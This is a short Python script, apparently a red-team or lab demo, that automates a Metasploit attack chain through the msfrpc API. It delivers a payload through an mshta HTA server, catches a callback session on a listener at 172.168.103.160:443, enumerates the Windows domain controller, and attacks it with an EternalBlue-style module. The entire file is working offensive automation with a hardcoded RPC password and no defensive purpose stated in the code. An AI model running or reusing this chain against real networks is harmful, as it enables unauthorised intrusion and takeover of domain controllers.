from time import sleep
import library.msf_session_list as session_list
from library.pymetasploit3.msfrpc import MsfRpcClient
import stage2.payloadDelivery.multi.mshta as mshta
import stage3.internalReconnaissance.windows.enumdom as enumdom
import stage3.internalC2.multi.pivot as pivot
import stage3.privilegeEscalation.windows.ebwin8 as EB

#os.system('./init.sh')
#sleep(20)
client = MsfRpcClient("123",port=55552)

def main():
    
    # INITIALISING THE REQUIRED COMPONENT IN THE DEMO: HTA LINK, DOMAIN CONTROLLER
    link = ''
    dc = ''

    #Stage2: creating and delivering payload to victim via hta server
    link = mshta.init(client)
    sid = session_list.init(client, lhost='172.168.103.160:443')
    
    #Stage3: Enumerate domain controller and create a pivot
    dc = enumdom.init(client,sid)
    #pivip = pivot.init(client,sid)

    #Attacking the domain controller
    EB.init(client,dc) 
    dcid = session_list.init(client, ip= dc)

print("[*][*] THIS PROGRAM IS AN AUTOMATION BASED ON THE SCENARIO SHOWN [*][*]")
sleep(3)
main()
